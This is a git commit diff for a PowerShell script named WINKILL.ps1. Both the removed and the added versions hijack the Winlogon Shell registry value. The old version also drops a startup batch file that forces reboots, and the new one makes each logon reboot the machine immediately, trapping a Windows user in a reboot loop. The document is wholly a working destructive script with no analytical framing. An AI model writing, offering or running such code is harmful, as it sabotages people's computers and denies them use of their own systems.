b7906078604a280567fe8392f04857a4a6e01422
KoTim <100821199+tim1363@users.noreply.github.com>
2025-05-16 14:01:23 +0300

    Update WINKILL.ps1

--- WINKILL.ps1
+++ WINKILL.ps1
@@ -1,8 +1,1 @@
-# Заменяем оболочку на notepad.exe
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "notepad.exe"
-
-# Создаем BAT в автозагрузке для автоматического ребута
-$batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\reboot.bat"
-$batContent = "@echo off`r`ntimeout /t 3 >nul`r`nshutdown /r /t 0"
-Set-Content -Path $batPath -Value $batContent -Encoding ASCII
-shutdown /r /t 0
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value "powershell -Command shutdown /r /t 0"
